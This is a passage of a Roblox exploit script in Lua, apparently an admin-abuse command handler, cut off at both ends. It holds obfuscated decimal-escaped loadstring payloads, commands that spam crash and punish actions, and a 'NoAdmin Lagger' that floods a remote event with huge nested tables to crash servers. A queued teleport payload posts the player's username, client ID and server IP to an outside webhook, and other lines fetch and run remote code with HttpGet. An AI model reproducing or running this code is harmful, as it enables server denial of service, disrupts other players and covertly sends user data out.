9\97\105\116\40\41\10\9\119\97\105\116\102\111\114\105\118\111\114\121\40\41\59\116\97\115\107\46\119\97\105\116\40\41\10\9\108\111\99\97\108\32\116\101\109\112\116\105\110\103\32\61\32\116\114\117\101\10\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\119\104\105\108\101\32\116\101\109\112\116\105\110\103\32\61\61\32\116\114\117\101\32\100\111\10\9\9\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\48\10\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\105\116\105\111\110\10\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\9\101\110\100\10\9\101\110\100\41\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\116\101\109\112\116\105\110\103\32\61\32\102\97\108\115\101\10\9\99\108\105\99\107\105\118\40\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\97\109\101\114\97\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\70\97\107\101\67\104\97\114\97\99\116\101\114\34\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\65\110\99\104\111\114\101\100\32\61\32\102\97\108\115\101\10\9\108\111\99\97\108\32\109\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\109\111\118\101\112\97\114\116\40\41\10\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\32\116\104\101\110\10\9\9\9\105\102\32\109\101\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\9\108\111\99\97\108\32\99\102\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\10\9\9\9\9\108\111\99\97\108\32\108\111\111\112\105\110\103\32\61\32\116\114\117\101\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\9\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\72\117\109\97\110\111\105\100\39\93\58\67\104\97\110\103\101\83\116\97\116\101\40\49\49\41\10\9\9\9\9\9\9\99\102\46\67\70\114\97\109\101\32\61\32\112\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\45\49\42\40\112\97\114\116\46\83\105\122\101\46\88\47\50\41\45\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\9\9\9\105\102\32\110\111\116\32\108\111\111\112\105\110\103\32\116\104\101\110\32\98\114\101\97\107\32\101\110\100\10\9\9\9\9\9\101\110\100\10\9\9\9\9\101\110\100\41\10\9\9\9\9\115\112\97\119\110\40\102\117\110\99\116\105\111\110\40\41\32\119\104\105\108\101\32\108\111\111\112\105\110\103\32\100\111\32\116\97\115\107\46\119\97\105\116\40\41\32\99\104\116\40\34\117\110\112\117\110\105\115\104\32\109\101\32\109\101\32\109\101\32\109\101\32\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\32\101\110\100\32\101\110\100\41\10\9\9\9\9\116\97\115\107\46\119\97\105\116\40\48\46\49\41\10\9\9\9\9\108\111\111\112\105\110\103\32\61\32\102\97\108\115\101\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\109\111\118\101\112\97\114\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\87\101\108\100\34\41\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\84\111\114\115\111\58\71\101\116\67\104\105\108\100\114\101\110\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\87\101\108\100\34\41\32\97\110\100\32\118\46\80\97\114\116\49\32\126\61\32\112\97\114\116\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\99\108\105\99\107\105\118\40\41\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\32\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\10\9\99\104\116\40\34\117\110\99\104\97\114\32\109\101\32\34\46\46\114\97\110\100\111\109\115\105\109\40\41\41\10\9\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\58\68\101\115\116\114\111\121\40\41\10\9\97\116\116\97\99\104\101\100\32\61\32\116\114\117\101\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\116\114\117\101\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\109\101\46\78\97\109\101\41\41\10\9\116\97\115\107\46\119\97\105\116\40\46\48\56\41\10\9\112\97\114\116\32\61\32\110\105\108\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\49\57\54\46\50\10\9\116\97\115\107\46\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\115\112\111\115\10\101\110\100\10\108\111\99\97\108\32\102\105\108\101\115\116\117\102\102\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\114\101\97\100\102\105\108\101\40\34\115\97\118\101\100\116\104\105\110\103\115\46\108\117\97\34\41\44\32\34\92\110\34\41\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\32\99\111\110\116\105\110\117\101\32\101\110\100\10\9\108\111\99\97\108\32\115\101\112\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\118\44\32\34\47\34\41\10\9\108\111\99\97\108\32\99\102\32\61\32\115\101\112\91\50\93\10\9\108\111\99\97\108\32\112\116\32\61\32\115\101\112\91\49\93\10\9\108\111\99\97\108\32\112\97\114\116\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\101\110\100\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\97\110\100\32\118\46\78\97\109\101\32\61\61\32\112\116\32\116\104\101\110\10\9\9\9\112\97\114\116\32\61\32\118\10\9\9\101\110\100\10\9\101\110\100\10\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\108\111\99\97\108\32\99\101\110\116\101\114\32\61\32\112\97\114\116\46\80\111\115\105\116\105\111\110\10\9\108\111\99\97\108\32\114\97\100\105\117\115\32\61\32\49\32\43\32\112\97\114\116\46\83\105\122\101\46\88\10\9\105\102\32\40\99\101\110\116\101\114\45\99\102\114\97\109\46\80\111\115\105\116\105\111\110\41\46\109\97\103\110\105\116\117\100\101\32\60\61\32\114\97\100\105\117\115\32\116\104\101\110\10\9\101\108\115\101\10\9\9\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\44\32\99\102\114\97\109\41\10\9\101\110\100\10\101\110\100\10")()
                    end
                    if msg:lower() == prefix .. "emergencymode1" then
                        testgrab = true
                        padAbuse = true
                        temploopgrab = true
                        cht("//serverlock")
                        cht("clr")
                        cht("fix")
                        cht("//spam punish others " .. math.random(1, 1000));wait(1)
                        testgrab = false
                        task.wait(5)
                        cht("//stop")
                        --loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/zoomer.lua'),true))();wait(1.65)
                    end
                    if msg:lower() == prefix .. "emergencymode2" then
                        if not syn then 
                            return 
                        end
                        --loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/zoomer.lua'),true))();wait(1.65) Zoomer kickrequests are not compatible with Synapse for some reason
                        --loadstring(game:HttpGet(('https://pastebin.com/raw/iiGhJQR0'),true))();wait()
                        cht("//toregen");wait(10)
                        testgrab = true ;wait()

                        padAbuse = true ;task.wait(1.5)

                        testgrab = false
                        cht("//silcrash");wait(15)
                        logn("Synapse only \n Make sure IY isn't loaded because it uses IY cmds")
                       -- loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))();wait()
                        --game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
                        local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
                        queueteleport([[


                        local Network = game:GetService("NetworkClient")
                        Network.ConnectionAccepted:Connect(function(Server, ReplicatorInstance)
                            _G.Server = Server:gsub("|", ":")
                        end)

                        repeat game:GetService("RunService").Heartbeat:Wait() until _G.Server
                        warn("The server's IP is ".._G.Server)
                        local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
                        local player = game.Players.LocalPlayer
                        local webhookcheck =
                            is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                            "Most likely jjsploit laugh at this clown"

                        print(webhookcheck)
                        local url = "https://websec.services/send/62c4be2a017082d5f33f3100"
                        local data = {
                        ["username"] = "NoAdmin Lagger v2.4X \n FE Script",
                        ["content"] = "To Join The User Press This Link (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \n \n To join the player using this link, install this plugin, it has other features btw. (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni) or just fucking use SearchBlox smh. Imagine learning how to script BUT NOT KNOWING HOW TO FUCKING USE SEARCHBLOX",
                        ["embeds"] = {
                            {
                                ["author"] = {
                                                    ["name"] = "tech is cool",
                                                    ["url"] = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
                                                    ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                                                },
                                    ["footer"] = {
                                                    ["text"] = "Mia is also cool",
                                                    ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                                                },
                                ["title"] = "**someone executed NAL v2.4**",
                                --["description"] = "Displayname: **"..yourmum.."** \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
                                ["description"] = string.format((game:GetService("RbxAnalyticsService"):GetClientId())..'\n '.._G.Server..' Profile: https://roblox.com/users/%d/profile\nUsername:** %s\n**DisplayName: **%s**\nUserID: **%d**\n Executor: **'..webhookcheck..'** \n GameID: **'..game.PlaceId..'** \n GameName: **'..GetName.Name..'** \n Avatar/Pfp:', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or ' N/A '), player.UserId),
                                ["type"] = "rich",
                                ["color"] = tonumber(0x7269da),
                                ["image"] = {
                                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                                        tostring(game:GetService("Players").LocalPlayer.Name)
                                }
                            }
                        }
                        }


                        local newdata = game:GetService("HttpService"):JSONEncode(data)

                        local headers = {
                        ["content-type"] = "application/json"
                        }
                        request = http_request or request or HttpPost or syn.request
                        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
                        request(abcdef)

                        -- nil I guess? ¯\_(ツ)_/¯

                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/tuuuu'),true))();wait()
                        function logn(L_6_arg0)
                            game.StarterGui:SetCore(
                                "SendNotification",
                                {
                                Title = "Shortcut",
                                Text = L_6_arg0,
                                Duration = 10
                            }
                            )
                        end

                        logn("NoAdmin Lagger v2.4X KAH Edit loaded")

                        if CS_LOADED and not _G.CS_DEBUG == true then
                            warn("No. Just stop already", 0)
                            return
                        end;
                        pcall(function()
                            getgenv().CS_LOADED = true
                        end)
                        print("Press the keybind C and it will start the lagger. \n Roblox has ratelimited this quite so it ain't that very effective anymore. \n It will automatically make you rejoin if your client disconnects. \n Pressing C again will disable the lag. In other words you can also time it to avoid getting crashed. \n To get the most out of this please use multi-instance execution. Synapse (Paid) and Fluxus (free) support that and 3 bots/clients has made a server crash before. \n Try to get atleast 3 to 4 bots in a server and then run the lagger and the server may crash")
                                --shared.cs'Preparing requests'
                        repeat
                            wait()
                        until game.CoreGui:FindFirstChild("RobloxPromptGui")
                        local L_1_, L_2_, L_3_ =
                                        game:GetService("Players").LocalPlayer,
                                        game.CoreGui.RobloxPromptGui.promptOverlay,
                                        game:GetService("TeleportService")
                        L_2_.ChildAdded:connect(
                                        function(L_7_arg0)
                            if L_7_arg0.Name == "ErrorPrompt" then
                                repeat
                                    execCmd("rejoin");wait(10)
                                    L_3_:Teleport(game.PlaceId)
                                    wait(2)
                                until false
                            end
                        end)
                --// sus
                getgenv().Toggled = false
                getgenv().KeyBind = "C"
                getgenv().Delay = 0.7
                local L_4_ = game:GetService'UserInputService'
                local function L_5_func()
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                    local function L_8_func(L_10_arg0)
                        local L_11_ = 49999
                        if type(L_10_arg0) ~= "number" then
                            return nil
                        end
                        local L_12_ = (L_11_ / (L_10_arg0 + 2))
                        return L_12_
                    end
                    local function L_9_func(L_13_arg0, L_14_arg1)
                        local L_15_ = {}
                        local L_16_ = {}
                        table.insert(L_16_, {})
                        z = L_16_[1]
                        for L_19_forvar0 = 1, L_13_arg0 do
                            local L_20_ = {}
                            table.insert(z, L_20_)
                            z = L_20_
                        end
                        local L_17_ = L_8_func(L_13_arg0)
                        local L_18_
                        if L_17_ then
                            L_18_ = L_17_
                        else
                            L_18_ = 10000
                        end
                        for L_21_forvar0 = 1, L_18_ do
                            table.insert(L_15_, L_16_)
                        end
                        if L_17_ then
                            L_18_ = L_17_
                        else
                            L_18_ = 10000
                        end
                        for L_22_forvar0 = 1, L_18_ do
                            table.insert(L_15_, L_16_)
                        end
                        for L_23_forvar0 = 1, L_14_arg1 do
                            game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(L_15_)
                        end
                    end
                    L_9_func(270, 5) --// change values if client crashes
                end
                L_4_.InputBegan:Connect(function(L_24_arg0)
                    if L_24_arg0.KeyCode == Enum.KeyCode[getgenv().KeyBind:upper()] and not L_4_:GetFocusedTextBox() then
                        if getgenv().Toggled then
                            getgenv().Toggled = false
                            warn'Disabled!'
                        elseif not getgenv().Toggled then
                            getgenv().Toggled = true
                            warn'Enabled!'
                            while getgenv().Toggled do
                                L_5_func()
                                wait(getgenv().Delay)
                            end
                        end
                    end
                end)
                            wait()
                            local debuginfo = {infCount = 0}

                            function debuginfo:new()
                                local guif = {}
                                local gui = Instance.new("ScreenGui")
                                if syn then
                                    syn.protect_gui(gui)
                                end
                                gui.Parent = game.CoreGui.RobloxGui
                                gui.Name = math.random(10000, 99999)
                                gui.ResetOnSpawn = false

                                function guif:newInfo(text)
                                    local frame = {}

                                    local text = text or ""

                                    local nText = Instance.new("TextLabel", gui)
                                    nText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                                    nText.Size = UDim2.new(0, 190, 0, 22)
                                    nText.Position = UDim2.new(0, 0, 0, 300 + (debuginfo.infCount * 14))
                                    nText.Font = Enum.Font.SourceSans
                                    nText.TextSize = 14
                                    nText.TextXAlignment = Enum.TextXAlignment.Right
                                    nText.TextColor3 = Color3.fromRGB(255, 255, 255)
                                    nText.BorderSizePixel = 0

                                    function frame:updateText(newText)
                                        text = newText
                                    end

                                    spawn(
                                        function()
                                            game:GetService("RunService").RenderStepped:Connect(
                                                function()
                                                    nText.Text = text
                                                    nText.Size = UDim2.new(0, 10000, 0, 10000)
                                                    nText.Size = UDim2.new(0, nText.TextBounds.X + 10, 0, nText.TextBounds.Y)
                                                end
                                            )
                                        end
                                    )

                                    debuginfo.infCount = debuginfo.infCount + 1

                                    return frame
                                end

                                return guif
                            end

                            local Config = {Strength = 3000, Amount = 0}

                            local APITarpit = debuginfo:new()
                            local Title = APITarpit:newInfo("// MTL Tarpit Stats \\\\")
                            local Strength = APITarpit:newInfo("KeepAliveRate: " .. Config.Strength)
                            local SEPLatency = APITarpit:newInfo("X->S SRVCheck: " .. 34832234 .. " : 3842")
                            local TimeBefore = os.clock()
                            local Resp = game.ReplicatedStorage.DefaultChatSystemChatEvents.GetInitDataRequest:InvokeServer()
                            repeat
                                game:GetService("RunService").RenderStepped:Wait()
                            until Resp
                            local EPSLatency =
                                APITarpit:newInfo("EP->S Latency *LATEST_INCOMING_REQUEST: " .. os.clock() - TimeBefore .. "ms")
                            local SX = APITarpit:newInfo("EP->S Latency *SPCLAT: " .. math.random() .. "s")

                                while wait(.05) do
                                    SX:updateText(
                                        "EP->S Latency *SPCLAT: " .. math.random() .. "s IT->R *SPCLAT: " .. math.random(1, 30) .. "." .. math.random())
                                    EPSLatency:updateText("LS->S Clock *SERVER_TIME_CLOCK_DIF: " .. workspace:GetServerTimeNow() - os.time() .. "s")
                                end]]);wait(5)
                            execCmd("rejoin")
                    end
                    if msg:lower() == prefix .. "previewbuild" then
                        loadstring("\108\111\99\97\108\32\102\105\108\101\115\116\117\102\102\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\114\101\97\100\102\105\108\101\40\34\115\97\118\101\100\116\104\105\110\103\115\46\108\117\97\34\41\44\32\34\92\110\34\41\10\108\111\99\97\108\32\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\110\101\119\98\111\120\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\116\119\101\101\110\115\101\114\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\119\101\101\110\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\110\117\109\10\108\111\99\97\108\32\116\111\111\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\111\111\108\34\44\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\41\10\116\111\111\108\46\78\97\109\101\32\61\32\34\80\114\101\118\105\101\119\32\66\117\105\108\100\34\10\116\111\111\108\46\82\101\113\117\105\114\101\115\72\97\110\100\108\101\32\61\32\102\97\108\115\101\10\116\111\111\108\46\67\97\110\66\101\68\114\111\112\112\101\100\32\61\32\102\97\108\115\101\10\116\111\111\108\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\116\111\111\108\46\69\113\117\105\112\112\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\9\108\111\99\97\108\32\115\112\108\105\116\115\116\114\32\61\32\118\58\115\112\108\105\116\40\39\47\39\41\10\9\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\10\9\9\9\99\111\110\116\105\110\117\101\10\9\9\101\110\100\10\9\9\102\111\114\32\95\44\32\97\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\9\105\102\32\97\46\78\97\109\101\32\61\61\32\115\112\108\105\116\115\116\114\91\49\93\32\97\110\100\32\97\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\9\99\111\114\111\117\116\105\110\101\46\119\114\97\112\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\9\9\108\111\99\97\108\32\112\97\114\116\32\61\32\97\10\9\9\9\9\9\108\111\99\97\108\32\99\102\32\61\32\115\112\108\105\116\115\116\114\91\50\93\10\9\9\9\9\9\108\111\99\97\108\32\112\116\32\61\32\115\112\108\105\116\115\116\114\91\49\93\10\9\9\9\9\9\108\111\99\97\108\32\112\97\114\116\10\9\9\9\9\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\9\9\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\9\9\9\9\101\110\100\10\10\9\9\9\9\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\9\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\32\61\32\97\58\67\108\111\110\101\40\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\53\10\9\9\9\9\9\110\101\119\112\97\114\116\46\67\70\114\97\109\101\32\61\32\99\102\114\97\109\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\42\40\97\46\83\105\122\101\46\88\47\50\41\43\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\9\9\110\101\119\112\97\114\116\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\9\9\9\9\9\110\101\119\112\97\114\116\46\78\97\109\101\32\61\32\34\70\97\107\101\32\80\97\114\116\32\34\46\46\105\10\9\9\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\41\10\9\9\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\98\111\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\101\108\101\99\116\105\111\110\66\111\120\34\41\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\65\100\111\114\110\101\101\32\61\32\110\101\119\112\97\114\116\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\67\111\108\111\114\51\32\61\32\110\101\119\112\97\114\116\46\67\111\108\111\114\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\110\101\119\112\97\114\116\46\67\111\108\111\114\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\53\10\9\9\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\45\45\48\46\55\10\9\9\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\98\111\120\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\105\110\102\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\48\46\54\44\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\81\117\97\100\44\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\79\117\116\44\48\44\102\97\108\115\101\44\48\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\49\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\110\101\119\112\97\114\116\44\116\119\101\101\110\105\110\102\44\123\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\125\41\10\9\9\9\9\9\108\111\99\97\108\32\116\119\101\101\110\50\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\110\101\119\112\97\114\116\98\111\120\44\116\119\101\101\110\105\110\102\44\123\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\44\32\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\125\41\10\9\9\9\9\9\116\119\101\101\110\49\58\80\108\97\121\40\41\10\9\9\9\9\9\116\119\101\101\110\50\58\80\108\97\121\40\41\10\9\9\9\9\101\110\100\41\40\41\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\116\111\111\108\46\85\110\101\113\117\105\112\112\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\101\110\100\41\10")()
                        -- I have to make bytecode out of this because it won't obfuscate for some reason. I've already tried many other things :/
                    end
                    if msg:lower() == prefix .. "lockapi" then
                        setclipboard("https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/Lock%20API%20Main.lua")
                        logn("Check your clipboard.")
                    end
                    if msg:lower() == prefix .. "slockmuter" then
